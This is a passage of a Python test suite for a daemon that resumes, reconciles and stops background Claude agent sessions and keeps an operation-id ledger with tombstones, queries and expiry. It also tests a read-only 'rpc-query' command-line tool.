                         "one session holds the id: the owner's")
        copies = [c for c in launches(self.claude) if c[-1] == sid]
        self.assertEqual(len(copies), 1)
        with open(os.path.join(self.claude, "calls.log")) as f:
            stops = [json.loads(line) for line in f if json.loads(line)[:1] == ["stop"]]
        copy = [r for r in json.loads(subprocess.run(["claude", "agents"], capture_output=True, text=True).stdout)
                if r["name"] == "resumed" and r["sessionId"] != sid and ["stop", r["id"]] in stops]
        self.assertEqual([r["state"] for r in copy], ["stopped"], "the copy was stopped")
        self.assertEqual([h for h in holders_of(copy[0]["sessionId"])], [], "and its process is gone")
        for h in holders_of(sid):
            os.kill(h["pid"], signal.SIGKILL)

    def test_j_a_stopped_seat_resumes_and_a_retired_one_is_refused(self):
        sid = str(uuidlib.uuid4())
        sminos.meta_set(sid, {"uuid": sid, "current": sid, "alias": "resumable", "group": "rpcproj", "cwd": self.root,
                              "status": "idle"})
        append_row(sid, {"type": "user", "uuid": str(uuidlib.uuid4()), "timestamp": iso(time.time()),
                         "cwd": self.root, "message": {"role": "user", "content": "hello"}})
        sminos.forget_caches()
        sminos.reconcile(tpr.project_of(self.root))
        self.here.sessions.add(sid)
        self.assertEqual(self.outcome(self.send("resume", {"session": sid}), 60),
                         {"state": "done", "result": {"session": sid}})
        sminos.forget_caches()
        self.assertNotEqual(sminos.state(sminos.reload_seat(sid)), "stopped", "the seat reads as running")
        for h in holders_of(sid):
            os.kill(h["pid"], signal.SIGKILL)
        gone = str(uuidlib.uuid4())
        sminos.meta_set(gone, {"uuid": gone, "current": gone, "alias": "retiredone", "group": "rpcproj",
                               "cwd": self.root, "status": "retired"})
        self.here.sessions.add(gone)
        o = self.refused(self.send("resume", {"session": gone}), "unsupported")
        self.assertIn("retired", o["error"]["message"])
        self.assertEqual(resumes(self.claude, gone), [])

    def test_j_a_claimed_resume_is_reconciled_from_its_own_launch(self):
        """A claimed Resume ran if a --bg process of its launch holds the
        session: started at or after the launch the claim records, its job
        the one the claim keeps. No launch recorded: nothing ran, said at
        once. A launch whose job was never kept (the daemon stopped while
        `claude --bg` ran, which outlives it: 2026-10-20's desk Resume) ran
        if a --bg process started since holds the session that no other
        Resume of it, still running then, may have started (a job id cannot
        say: every --bg job of a session shares one); until one does, or
        the window ends, it may still come."""
        sid, late, unlaunched, jobless, never, other = (ended_session(self.root) for _ in range(6))
        launched = time.time()
        self.claim("JJJJJJJJJJJJJJJJJJJJJA", "resume", sid, self.clock[0], launched_at=launched, job=sid[:8])
        self.claim("KKKKKKKKKKKKKKKKKKKKKA", "resume", late, self.clock[0] - rpcs.RESUME_TRACE_S - 1,
                   launched_at=launched - rpcs.RESUME_TRACE_S - 1, job=late[:8])
        self.claim("LLLLLLLLLLLLLLLLLLLLLA", "resume", unlaunched, self.clock[0])
        self.claim("OOOOOOOOOOOOOOOOOOOOOA", "resume", jobless, self.clock[0], launched_at=launched)
        # An earlier Resume of the same session, answered before this launch: its job id is the same
        # (the engine names a session's every --bg job by its id's first 8), its process long gone.
        self.claim("TTTTTTTTTTTTTTTTTTTTTA", "resume", jobless, self.clock[0] - 3600, launched_at=launched - 3600,
                   job=jobless[:8], outcome={"state": "done", "result": {"session": jobless}},
                   done_at=launched - 3590, acked=True)
        self.claim("QQQQQQQQQQQQQQQQQQQQQA", "resume", never, self.clock[0], launched_at=launched)
        # Another Resume of `other` launched at the same time and still runs: the process holding it
        # may be that one's.
        self.claim("RRRRRRRRRRRRRRRRRRRRRA", "resume", other, self.clock[0], launched_at=launched)
        self.claim("SSSSSSSSSSSSSSSSSSSSSA", "resume", other, self.clock[0], launched_at=launched, job=other[:8])
        time.sleep(1.1)  # whole seconds, as ps reads a start: the launches below are after the claims'
        for s in (jobless, other):
            subprocess.run(["claude", "--bg", "--resume", s], cwd=self.root, capture_output=True, check=True)
        self.clock[0] = time.time()  # an outcome's done_at, on this clock, is compared with a real launch time
        try:
            with mock.patch.dict(os.environ, {"SMINOS_UUID_POLL": "3", "SMINOS_POLL_INTERVAL": "0.05"}):
                r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
                first = r.due({self.pid})
                self.assertEqual(results(first, "JJJJJJJJJJJJJJJJJJJJJA"), [], "its job may still come")
                self.assertEqual([x["error"]["code"] for x in results(first, "LLLLLLLLLLLLLLLLLLLLLA")],
                                 ["interrupted"], "stopped before its launch: nothing ran, said at once")
                self.assertEqual(results(first, "OOOOOOOOOOOOOOOOOOOOOA"),
                                 [{"state": "done", "result": {"session": jobless}}],
                                 "its job never kept, but a --bg process started since holds the session, and the "
                                 "only other Resume of it was answered before this launch: it ran")
                self.assertEqual(results(first, "QQQQQQQQQQQQQQQQQQQQQA"), [],
                                 "its job never kept, nothing holds the session yet: its launch may still land")
                self.assertEqual(results(first, "RRRRRRRRRRRRRRRRRRRRRA"), [],
                                 "another Resume running then may have started the process holding it: "
                                 "no evidence for this one")
                self.assertEqual([x["error"]["code"] for x in self.reconciled(r, "KKKKKKKKKKKKKKKKKKKKKA")],
                                 ["interrupted"], "past the window with no job holding it")
                subprocess.run(["claude", "--bg", "--resume", sid], cwd=self.root, capture_output=True, check=True)
                self.assertEqual(self.reconciled(r, "JJJJJJJJJJJJJJJJJJJJJA"),
                                 [{"state": "done", "result": {"session": sid}}], "its launch's job holds it: it ran")
                self.clock[0] += rpcs.RESUME_TRACE_S + 1
                for nonce in ("QQQQQQQQQQQQQQQQQQQQQA", "RRRRRRRRRRRRRRRRRRRRRA"):
                    self.assertEqual([x["error"]["code"] for x in self.reconciled(r, nonce)], ["interrupted"],
                                     "past the window with no process of its launch holding it")
        finally:
            for s in (sid, jobless, other):
                for h in holders_of(s):
                    os.kill(h["pid"], signal.SIGKILL)

    def test_j_a_holder_older_than_the_claimed_launch_is_no_evidence(self):
        sid = ended_session(self.root)
        subprocess.run(["claude", "--bg", "--resume", sid], cwd=self.root, capture_output=True, check=True)
        try:
            self.assertTrue(holders_of(sid), "a --bg job already holds it")
            time.sleep(1.2)  # the launch the claim records comes a whole second after it started
            launched = time.time()
            self.claim("MMMMMMMMMMMMMMMMMMMMMA", "resume", sid, self.clock[0], launched_at=launched, job=sid[:8])
            self.claim("NNNNNNNNNNNNNNNNNNNNNA", "resume", sid, self.clock[0], launched_at=launched)
            with mock.patch.dict(os.environ, {"SMINOS_UUID_POLL": "3", "SMINOS_POLL_INTERVAL": "0.05"}):
                r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
                first = r.due({self.pid})
                self.assertEqual(results(first, "MMMMMMMMMMMMMMMMMMMMMA"), [], "not taken as its launch")
                self.assertEqual(results(first, "NNNNNNNNNNNNNNNNNNNNNA"), [],
                                 "no job kept: not taken as its launch either; its own may still come")
                self.assertTrue(wait_for(lambda: (r.take(), "MMMMMMMMMMMMMMMMMMMMMA" not in r.flight)[1]),
                                "the harness was asked about its job")
                r.next_reconcile = 0.0
                self.assertEqual(results(r.due({self.pid}), "MMMMMMMMMMMMMMMMMMMMMA"), [],
                                 "the job is the session's own, not a copy: its holder may still come")
                self.clock[0] += rpcs.RESUME_TRACE_S + 1
                for nonce in ("MMMMMMMMMMMMMMMMMMMMMA", "NNNNNNNNNNNNNNNNNNNNNA"):
                    self.assertEqual([x["error"]["code"] for x in self.reconciled(r, nonce)], ["interrupted"])
        finally:
            for h in holders_of(sid):
                os.kill(h["pid"], signal.SIGKILL)

    def test_j_a_claimed_resume_whose_job_is_a_copy_has_the_copy_stopped(self):
        """Stopped after its job was kept and before the copy check: the
        harness reports that job under another session — a copy the engine
        started, which the reconciliation stops, the RPC failed
        copy-started, rather than left to run."""
        sid = ended_session(self.root)
        launched = time.time()
        out = subprocess.run(["claude", "--bg", "--resume", sid, "--model", "sonnet"], cwd=self.root,
                             capture_output=True, text=True, check=True).stdout
        short = rpcs.BG_SHORT_RE.search(out).group(1)
        rows = json.loads(subprocess.run(["claude", "agents"], capture_output=True, text=True, check=True).stdout)
        copy = next(row["sessionId"] for row in rows if row["id"] == short)
        self.assertNotEqual(copy, sid)
        self.assertTrue(holders_of(copy), "the copy runs")
        self.claim("PPPPPPPPPPPPPPPPPPPPPA", "resume", sid, self.clock[0], launched_at=launched, job=short)
        try:
            with mock.patch.dict(os.environ, {"SMINOS_UUID_POLL": "3", "SMINOS_POLL_INTERVAL": "0.05"}):
                r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
                o = self.reconciled(r, "PPPPPPPPPPPPPPPPPPPPPA")
            self.assertEqual([x["error"]["code"] for x in o], ["copy-started"], o)
            self.assertIn("was stopped", o[0]["error"]["message"])
            self.assertEqual(holders_of(copy), [], "the copy no longer runs")
        finally:
            for h in holders_of(copy) + holders_of(sid):
                os.kill(h["pid"], signal.SIGKILL)
            # Its stopped row would read as another test's stopped copy.
            os.unlink(os.path.join(self.claude, "agents", short + ".json"))

    def test_j_the_launch_is_kept_before_it_runs(self):
        sid = ended_session(self.root)
        self.here.sessions.add(sid)
        before = time.time()
        rpc = self.send("resume", {"session": sid})
        self.assertEqual(self.outcome(rpc, timeout=60)["state"], "done")
        e = self.ledger()[rpc["nonce"]]
        self.assertGreaterEqual(e["launched_at"], before - 1)
        self.assertEqual(e["job"], sid[:8], "the job it started")
        for h in holders_of(sid):
            os.kill(h["pid"], signal.SIGKILL)

    def test_j_the_live_checks_call_path_runs_against_the_stand_in(self):
        """tests/mods/live-resume-check.py's own calls, run here against the
        `claude` stand-in: its daemon's side of a Resume (RESUME) in each of
        its modes, and its reads and writes of sminos (SMINOS). A change to
        any of their call paths breaks this, not only a by-hand engine run."""
        import importlib.util
        path = os.path.join(tsp.HERE, "mods", "live-resume-check.py")
        spec = importlib.util.spec_from_file_location("live_resume_check", path)
        live = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(live)

        def run(script, op, *args):
            r = subprocess.run([sys.executable, "-c", script, tsp.SCRIPTS, op, self.root, *args],
                               capture_output=True, text=True, timeout=120)
            self.assertEqual(r.returncode, 0, r.stderr)
            return [json.loads(line) for line in r.stdout.splitlines() if line.strip()]

        def stop(sid):
            for h in holders_of(sid):
                os.kill(h["pid"], signal.SIGKILL)

        rows = os.path.join(self.claude, "agents")
        os.makedirs(rows, exist_ok=True)
        before = set(os.listdir(rows))
        sid = ended_session(self.root)
        try:
            _, got = run(live.RESUME, "resume", sid, sid)
            self.assertEqual(sorted(map(str, map(live.code_of, got))),
                             [str(("done", None)), str(("failed", "session-live"))], "two at once: one session")
            self.assertEqual([e["job"] for e in got if "launched_at" in e], [sid[:8]], "one launch, its job kept")
            stop(sid)
            [[nonce]] = run(live.RESUME, "die-before-job", sid)
            self.assertEqual(sorted(k for k in ("launched_at", "job", "outcome") if k in self.ledger()[nonce]),
                             ["launched_at"], "stopped once its launch returned, before its job was kept")
            [got] = run(live.RESUME, "restart", "20", nonce)
            self.assertEqual(got[0]["outcome"], {"state": "done", "result": {"session": sid}})
            stop(sid)
            [[nonce]] = run(live.RESUME, "die-after-job", sid)
            self.assertEqual(self.ledger()[nonce]["job"], sid[:8], "stopped once its job was kept")
            self.assertNotIn("outcome", self.ledger()[nonce])
            [got] = run(live.RESUME, "restart-past-window", "20", nonce)
            self.assertEqual(got[0]["outcome"], {"state": "done", "result": {"session": sid}})
            stop(sid)
            open(os.path.join(self.claude, "reopen-first"), "w").close()
            _, got = run(live.RESUME, "skip-check", sid)
            self.assertEqual(live.code_of(got[0]), ("failed", "copy-started"))
        finally:
            stop(sid)
            # A copy's stopped row would read as another test's stopped copy.
            for name in set(os.listdir(rows)) - before:
                os.unlink(os.path.join(rows, name))

        gone = ended_session(self.root)
        [keys] = run(live.SMINOS, "send", gone, "from far away", "from the desk")
        self.assertEqual(len(keys), 2)
        r = cli("daemon", "tick")
        self.assertEqual(r.returncode, 0, r.stderr)
        [got] = run(live.SMINOS, "outcomes", gone)
        self.assertEqual(sorted((o["event"]["writer"], o["event"]["seq"], o["outcome"]) for o in got),
                         sorted((w, s, "recorded") for w, s in keys))
        self.assertEqual(run(live.SMINOS, "latest", gone), [{"kind": "retired", "reason": "ended"}])
        self.assertEqual(run(live.SMINOS, "seat", gone), [None])
        sminos.meta_set(gone, {"uuid": gone, "current": gone, "alias": "pinned", "group": "rpcproj", "cwd": self.root,
                               "status": "retired"})
        try:
            self.assertEqual(run(live.SMINOS, "seat", gone), [{"alias": "pinned", "status": "retired",
                                                               "state": "retired"}])
        finally:
            sminos.unlink_seat_files(gone)

    def test_j_a_job_whose_process_never_holds_the_session_is_a_failure(self):
        sid = ended_session(self.root)
        self.here.sessions.add(sid)
        open(os.path.join(self.claude, "no-hold"), "w").close()
        try:
            with mock.patch.object(rpcs, "RESUME_HELD_S", 1.0):
                o = self.refused(self.send("resume", {"session": sid}), "failed")
        finally:
            os.unlink(os.path.join(self.claude, "no-hold"))
        self.assertIn(sid[:8], o["error"]["message"], "naming the job")
        self.assertEqual(holders_of(sid), [])

    def test_i_results_are_republished_until_acknowledged(self):
        self.mod.turn = "t9"
        rpc = self.send("interrupt", {"session": self.bridged.sid})
        self.outcome(rpc)
        self.assertEqual(results(self.r.due({self.pid}), rpc["nonce"]), [], "not twice on one stream")
        self.r.reset()  # a new stream
        self.assertEqual(len(results(self.r.opening(self.pid), rpc["nonce"])), 1, "after hello on the next")
        self.r.ack({"t": "rpc-ack", "project": self.pid, "nonce": rpc["nonce"]})
        self.r.reset()
        self.assertEqual(results(self.r.opening(self.pid), rpc["nonce"]), [], "acknowledged: kept, not sent")
        self.assertTrue(self.ledger()[rpc["nonce"]]["acked"])

    def test_i_an_outcome_that_cannot_be_kept_is_sent_only_once_it_is(self):
        """DX6 records the outcome before the result goes up. One whose
        ledger write fails goes nowhere — the file holds the claim, which a
        restart would reconcile, so nothing sent could contradict it — and
        goes up once a later write keeps it."""
        self.mod.turn = "turn-i2"
        nonce = codes.b64url(os.urandom(16))
        failing = [True]
        real = rpcs.Ledger.save

        def save(ledger):
            if failing[0] and "outcome" in (ledger.entries.get(nonce) or {}):
                raise OSError("No space left on device")
            return real(ledger)

        with mock.patch.object(rpcs.Ledger, "save", save):
            rpc = self.send("interrupt", {"session": self.bridged.sid}, nonce=nonce)
            self.assertTrue(wait_for(lambda: (self.r.take(), nonce not in self.r.flight)[1]), "it ran")
            self.assertEqual(len(self.mod.ops("interrupt")), 1)
            self.assertEqual(results(self.collect(), nonce), [], "its outcome is not kept: nothing goes up")
            self.assertNotIn("outcome", self.ledger()[nonce], "the file holds its claim")
            self.assertEqual(results(self.r.opening(self.pid), nonce), [], "nor after a hello")
            self.clock[0] += rpcs.RECONCILE_EVERY
            self.assertEqual(results(self.collect(), nonce), [], "written again, and failing again: still nothing")
            failing[0] = False
            self.clock[0] += rpcs.RECONCILE_EVERY
            o = self.outcome(rpc)
        self.assertEqual((o["state"], o["result"]["turnId"]), ("done", "turn-i2"), "the outcome it reached, kept now")
        self.assertEqual(self.ledger()[nonce]["outcome"], o)
        self.assertEqual(len(results(self.frames, nonce)), 1, "sent once")

    # ------------------------------------------------ the opId ledger (P5-O12 M2)

    def send_op(self, name, args, op=None, op_created=None, **kw):
        """An RPC keyed by an operation id (RL4): a new one unless `op`, its
        `opCreated` its `created` unless given."""
        created = kw.setdefault("created", iso(time.time()))
        return self.send(name, args, op_id=op or new_op(), op_created=op_created or created, **kw)

    def test_o_an_op_id_keys_the_ledger_and_its_nonce_answers_the_hub(self):
        """The opId is the ledger's key and the bridge command's `rpc`; the
        hub's rpc-result and rpc-ack stay the nonce's, which the entry keeps.
        An RPC without one is keyed by its nonce, as before."""
        self.mod.turn = "t-o1"
        rpc = self.send_op("steer", {"session": self.bridged.sid, "text": "by op"})
        op = rpc["opId"]
        o = self.outcome(rpc)
        self.assertEqual(o["state"], "done", o)
        self.assertEqual(self.mod.ops("steer")[-1]["rpc"], op, "the child keeps its answer under the op")
        e = self.ledger()[op]
        self.assertEqual(e["nonce"], rpc["nonce"])
        self.assertAlmostEqual(e["op_created"], rpcs.created_at(rpc["opCreated"]), places=3)
        self.assertNotIn(rpc["nonce"], self.ledger())
        self.r.ack({"t": "rpc-ack", "project": self.pid, "nonce": rpc["nonce"]})
        self.assertTrue(self.ledger()[op]["acked"], "acknowledged by its nonce")
        legacy = self.send("interrupt", {"session": self.bridged.sid})
        self.assertEqual(self.outcome(legacy)["state"], "done")
        self.assertNotIn("nonce", self.ledger()[legacy["nonce"]], "keyed by its nonce, as today")

    def test_o_a_reseal_of_an_answered_op_is_answered_from_the_ledger_under_its_own_nonce(self):
        self.mod.turn = "t-o2"
        first = self.send_op("steer", {"session": self.bridged.sid, "text": "once"})
        o = self.outcome(first)
        self.clock[0] += 30
        again = self.send_op("steer", {"session": self.bridged.sid, "text": "once"}, op=first["opId"],
                             op_created=first["opCreated"], created=iso(self.clock[0]))
        self.assertNotEqual(again["nonce"], first["nonce"])
        self.assertEqual(self.outcome(again), o, "the stored result, to the copy that waits for it")
        self.assertEqual(len(self.mod.ops("steer")), 1, "run once")
        self.assertEqual(self.ledger()[first["opId"]]["nonce"], again["nonce"])

    def test_o_an_op_id_and_its_created_are_checked_before_the_ledger(self):
        self.mod.turn = "t-o3"
        session = {"session": self.bridged.sid}
        now = iso(time.time())
        for bad in ("short-op-id-15c", "x" * 129, "has.a.dot.in.it.0", "a/b" * 6, 12345678901234567, ["x" * 16]):
            rpc = self.send("interrupt", session, op_id=bad, op_created=now)
            self.refused(rpc, "bad-op-id")
            self.assertNotIn(rpc["nonce"], self.ledger())
        missing = self.send("interrupt", session, op_id=new_op())
        self.refused(missing, "bad-op-created")
        c = time.time()
        for bad in ("yesterday", c, iso(c + rpcs.FRESH_S + 2)):
            rpc = self.send("interrupt", session, op_id=new_op(), op_created=bad, created=iso(c))
            self.refused(rpc, "bad-op-created")
            self.assertNotIn(rpc["opId"], self.ledger(), "refused before the ledger")
        self.assertEqual(self.mod.ops("interrupt"), [], "nothing ran")
        bound = self.send_op("interrupt", session, op_created=iso(c + rpcs.FRESH_S), created=iso(c))
        self.assertEqual(self.outcome(bound)["state"], "done", "opCreated up to FRESH_S after created")

    def test_o_query_answers_by_state(self):
        self.mod.turn = "t-o4"
        session = {"session": self.bridged.sid}
        ran = self.send_op("steer", {**session, "text": "asked about"})
        o = self.outcome(ran)
        self.assertEqual(self.r.query(ran["opId"]), {"state": "done", "outcome": o})
        old = iso(self.clock[0] - 90)
        stale = self.send_op("interrupt", session, created=old, op_created=old)
        self.assertEqual(self.r.query(stale["opId"]), {"state": "refused", "outcome": self.refused(stale, "stale")})
        claimed = new_op()
        self.assertTrue(self.r.ledger.claim(claimed, {"project": self.pid, "rpc": "steer", "session": self.bridged.sid,
                                                      "at": self.clock[0]}))
        self.assertEqual(self.r.query(claimed), {"state": "in-progress"})
        self.assertEqual(self.r.query(new_op()), {"state": "not-received"})
        self.assertEqual(self.r.query(new_op(), self.clock[0] - 3600), {"state": "not-received"}, "inside the horizon")
        self.assertEqual(self.r.query(new_op(), self.clock[0] - rpcs.OP_HORIZON - 1), {"state": "expired"})
        loose = self.send_op("interrupt", session, machine="mini")
        self.refused(loose, "wrong-machine")
        self.assertEqual(self.r.query(loose["opId"]), {"state": "not-received"}, "a refusal before the ledger ran nothing")
        self.clock[0] += rpcs.OP_HORIZON + 10
        self.assertIn(ran["opId"], self.r.ledger.entries, "the ledger still holds it")
        self.assertEqual(self.r.query(ran["opId"]), {"state": "expired"}, "past the horizon by its stored opCreated")
        path = os.path.join(os.environ["SMINOS_HOME"], "daemon", rpcs.LEDGER_FILE)
        with open(path, "w") as f:
            f.write('{"half-written": ')
        broken = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
        self.assertEqual(broken.query(new_op()), {"state": "unavailable"}, "never not-received")
        self.assertEqual(broken.tombstone(new_op()), {"ok": False, "state": "unavailable"})

    def test_o_an_op_tombstoned_before_it_arrives_is_refused_and_never_runs(self):
        self.mod.turn = "t-o5"
        op = new_op()
        self.assertEqual(self.r.tombstone(op), {"ok": True})
        self.assertEqual(self.r.tombstone(op), {"ok": True}, "again: the same answer")
        self.assertEqual(self.r.query(op), {"state": "not-received"})
        late = self.send_op("steer", {"session": self.bridged.sid, "text": "too late"}, op=op)
        self.assertNotIn(op, self.r.flight, "it never reached flight")
        self.refused(late, "tombstoned")
        self.assertEqual(self.mod.ops("steer"), [], "nothing ran")
        self.assertTrue(self.ledger()[op]["tombstone"])
        self.assertNotIn("outcome", self.ledger()[op], "the tombstone stands")

    def test_o_a_tombstone_is_refused_while_its_op_is_in_flight_or_claimed(self):
        self.mod.turn = "t-o6"
        reached, gate = threading.Event(), threading.Event()
        plan = self.r.plan

        def paused(rpc, facts):   # the worker, between admission and its claim
            reached.set()
            gate.wait(10)
            return plan(rpc, facts)

        self.r.plan = paused
        rpc = self.send_op("steer", {"session": self.bridged.sid, "text": "in flight"})
        op = rpc["opId"]
        self.assertTrue(reached.wait(10))
        self.assertEqual(self.r.tombstone(op), {"ok": False, "state": "in-progress"})
        self.assertEqual(self.r.query(op), {"state": "in-progress"})
        gate.set()
        self.assertEqual(self.outcome(rpc)["state"], "done")
        self.assertEqual(self.r.tombstone(op), {"ok": False, "state": "done"})
        self.assertEqual(len(self.mod.ops("steer")), 1)
        claimed = new_op()   # a claim a stop left, no worker holding it
        self.claim(claimed, "steer", self.bridged.sid, self.clock[0], nonce=codes.b64url(os.urandom(16)))
        restarted = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
        self.assertEqual(restarted.tombstone(claimed), {"ok": False, "state": "in-progress"})
        self.assertNotIn("tombstone", self.ledger()[claimed])
        old = iso(self.clock[0] - 90)
        stale = self.send_op("interrupt", {"session": self.bridged.sid}, created=old, op_created=old)
        self.refused(stale, "stale")
        self.assertEqual(self.r.tombstone(stale["opId"]), {"ok": False, "state": "refused"})

    def test_o_a_tombstone_survives_a_restart_and_is_never_answered_interrupted(self):
        self.mod.turn = "t-o7"
        op = new_op()
        self.assertEqual(self.r.tombstone(op), {"ok": True})
        self.clock[0] += rpcs.SPAWN_TRACE_S + rpcs.RESUME_TRACE_S   # past every trace's window
        self.r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
        self.assertEqual([f for f in self.r.due({self.pid}) if f.get("t") == "rpc-result"], [])
        self.assertTrue(self.ledger()[op]["tombstone"])
        self.assertNotIn("outcome", self.ledger()[op], "not reconciled as a claim")
        late = self.send_op("steer", {"session": self.bridged.sid, "text": "after a restart"}, op=op,
                            created=iso(self.clock[0]))
        self.refused(late, "tombstoned")
        self.assertEqual(self.mod.ops("steer"), [])

    def test_o_a_reseal_of_a_pruned_op_is_refused_never_run(self):
        self.mod.turn = "t-o8"
        first = self.send_op("steer", {"session": self.bridged.sid, "text": "a day ago"})
        self.assertEqual(self.outcome(first)["state"], "done")
        op = first["opId"]
        self.clock[0] += rpcs.KEPT_S + 1
        later = self.send("interrupt", {"session": self.bridged.sid}, created=iso(self.clock[0]))
        self.assertEqual(self.outcome(later)["state"], "done")
        self.assertNotIn(op, self.ledger(), "pruned by the write after it")
        reseal = self.send_op("steer", {"session": self.bridged.sid, "text": "a day ago"}, op=op,
                              op_created=first["opCreated"], created=iso(self.clock[0]))
        self.refused(reseal, "expired")
        bare = self.send("steer", {"session": self.bridged.sid, "text": "a day ago"}, op_id=op,
                         created=iso(self.clock[0]))
        self.refused(bare, "bad-op-created")
        self.assertEqual(len(self.mod.ops("steer")), 1, "never run again")
        self.assertNotIn(op, self.ledger(), "nothing reopened it")
        self.assertEqual(self.r.query(op, rpcs.created_at(first["opCreated"])), {"state": "expired"})
        legacy = self.send("interrupt", {"session": self.bridged.sid},
                           created=iso(self.clock[0] - rpcs.OP_HORIZON - 5))
        self.refused(legacy, "expired")   # its created is its opCreated

    def test_o_a_claim_left_by_a_stop_is_reconciled_by_its_op_and_answered_under_its_nonce(self):
        self.mod.turn = "t-o9"
        op, nonce = new_op(), codes.b64url(os.urandom(16))
        self.claim(op, "steer", self.bridged.sid, time.time(), nonce=nonce)
        landed = rpcs.steer(rpcs.bridge.endpoint(self.bridged.sid), "landed by op", op)
        self.assertEqual(landed["state"], "done")
        r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
        self.assertEqual(results(r.due({self.pid}), nonce), [landed])

    def test_o_the_op_names_the_upload_and_its_files(self):
        asked = self.send_op("media", {"session": self.bridged.sid, "delivery": "queued-turn",
                                       "attachments": self.attachments(("shot.png", "image/png", PNG))})
        op = asked["opId"]
        o = self.outcome(asked)
        self.assertEqual((o["state"], o["result"]["upload"], o["result"]["paths"]), ("done", op, [op + ".0.png"]), o)
        cmd = self.mod.ops("media")[-1]
        self.assertEqual((cmd["upload"], cmd["rpc"]), (op, op))
        self.assertEqual(self.uploads_of(self.root), [op + ".0.png"])
        self.assertEqual(self.ledger()[op]["op_id"], op)

    def test_o_a_spawn_by_op_is_stamped_and_named_by_it(self):
        tpr.set_policy({"read_only": False, "ceiling": "acceptEdits"})
        rpc = self.send_op("spawn", {"checkout": self.root, "brief": "keyed by op"})
        op = rpc["opId"]
        o = self.outcome(rpc, timeout=60)
        self.assertEqual((o["state"], o["result"]["alias"]), ("done", rpcs.alias_for(op)), o)
        self.assertEqual([s["current"] for s in sminos.seats() if s.get("rpc_nonce") == op], [o["result"]["session"]])

    def test_o_rpc_query_prints_the_ledger_files_view(self):
        self.mod.turn = "t-o10"
        rpc = self.send_op("steer", {"session": self.bridged.sid, "text": "asked from the CLI"})
        o = self.outcome(rpc)
        path = os.path.join(os.environ["SMINOS_HOME"], "daemon", rpcs.LEDGER_FILE)
        with open(path, "rb") as f:
            before = f.read()

        def view(op, *options):
            # As the CLI documents it: `--` before the id, which may start with `-` (base64url).
            p = cli("rpc-query", *options, "--", op)
            return p.returncode, json.loads(p.stdout)

        rc, v = view(rpc["opId"])
        self.assertEqual((rc, v["state"], v["outcome"], v["entry"]["nonce"]), (0, "done", o, rpc["nonce"]))
        rc, v = view(new_op())
        self.assertEqual((rc, v["state"]), (0, "not-received"))
        self.assertIn("in-progress", v["note"], "it says what it cannot see")
        rc, v = view(new_op(), "--created", iso(time.time() - rpcs.OP_HORIZON - 60))
        self.assertEqual((rc, v["state"]), (0, "expired"))
        with open(path, "rb") as f:
            self.assertEqual(f.read(), before, "it reads the ledger, and writes nothing")
        with open(path, "w") as f:
            f.write('{"half-written": ')
        rc, v = view(new_op())
        self.assertEqual((rc, v["state"]), (1, "unavailable"))

    def test_o_rpc_query_takes_an_op_id_that_starts_with_a_dash(self):
        """A base64url op id may start with `-` (1 in 64 of them): `--`
        before it, as the CLI's help says, keeps it from reading as an
        option; without it, it does."""
        self.mod.turn = "t-o12"
        op = "-dashLeadingOp_0001"
        rpc = self.send_op("steer", {"session": self.bridged.sid, "text": "a dash first"}, op=op)
        o = self.outcome(rpc)
        p = cli("rpc-query", "--", op)
        self.assertEqual(p.returncode, 0, p.stderr)
        self.assertEqual((json.loads(p.stdout)["op"], json.loads(p.stdout)["state"], json.loads(p.stdout)["outcome"]),
                         (op, "done", o))
        p = cli("rpc-query", "--created", rpc["opCreated"], "--", op)
        self.assertEqual((p.returncode, json.loads(p.stdout)["state"]), (0, "done"))
        self.assertNotEqual(cli("rpc-query", op).returncode, 0, "without `--`, it reads as an option")

    def test_o_rpc_query_changes_nothing_but_reads_the_ledger(self):
        """A diagnostic: it runs before the migration every other verb runs,
        so a legacy record stays as it was, and no lock or record is made."""
        self.mod.turn = "t-o11"
        rpc = self.send_op("steer", {"session": self.bridged.sid, "text": "asked from a fresh home"})
        o = self.outcome(rpc)
        home = os.path.join(T, "rpc-query-" + uuidlib.uuid4().hex[:8])
        state = os.path.join(home, "sminos")
        os.makedirs(os.path.join(state, "daemon"), mode=0o700)
        shutil.copy(os.path.join(os.environ["SMINOS_HOME"], "daemon", rpcs.LEDGER_FILE),
                    os.path.join(state, "daemon", rpcs.LEDGER_FILE))
        legacy = os.path.join(state, "legacy-worker.json")
        with open(legacy, "w") as f:   # what migrate stamps a group on, retires, and tightens to 0600
            json.dump({"engine": "codex", "status": "done", "alias": "old-worker", "cwd": self.root, "pid": 1}, f)
        os.chmod(legacy, 0o644)

        def tree():
            out = {}
            for d, _, names in os.walk(home):
                for n in names:
                    q = os.path.join(d, n)
                    with open(q, "rb") as f:
                        out[os.path.relpath(q, home)] = (f.read(), os.stat(q).st_mode)
            return out

        before = tree()
        p = subprocess.run([CLI, "rpc-query", "--", rpc["opId"]], capture_output=True, text=True,
                           env={**os.environ, "HOME": home, "SMINOS_HOME": state})
        self.assertEqual(p.returncode, 0, p.stderr)
        self.assertEqual((json.loads(p.stdout)["state"], json.loads(p.stdout)["outcome"]), ("done", o))
        self.assertEqual(tree(), before, "no record rewritten, no lock or metadata made")
        self.assertFalse(os.path.exists(os.path.join(home, ".claude")), "no migration lock")

    # ------------------------------------------------ ticket 11 (O12 M7a)

    def test_q_a_reseal_in_flight_runs_once_and_is_answered_under_its_nonce(self):
        """Ticket 11a: a reseal of an op a worker holds, before its claim (the
        worker inside `plan`) and after it (the bridge holding the command),
        runs nothing again, and the op's one outcome goes up under the
        latest nonce, the one the hub waits for."""
        self.mod.turn = "t-q1"
        reached, gate = threading.Event(), threading.Event()
        plan = self.r.plan

        def paused(rpc, facts):   # the worker, between admission and its claim
            reached.set()
            gate.wait(10)
            return plan(rpc, facts)

        self.r.plan = paused
        first = self.send_op("steer", {"session": self.bridged.sid, "text": "resealed before its claim"})
        op = first["opId"]
        self.assertTrue(reached.wait(10))
        again = self.send_op("steer", {"session": self.bridged.sid, "text": "resealed before its claim"}, op=op,
                             op_created=first["opCreated"])
        self.assertNotIn(op, self.ledger(), "no claim yet")
        self.assertEqual(self.r.flight[op]["nonce"], again["nonce"], "the in-flight op carries the latest nonce")
        gate.set()
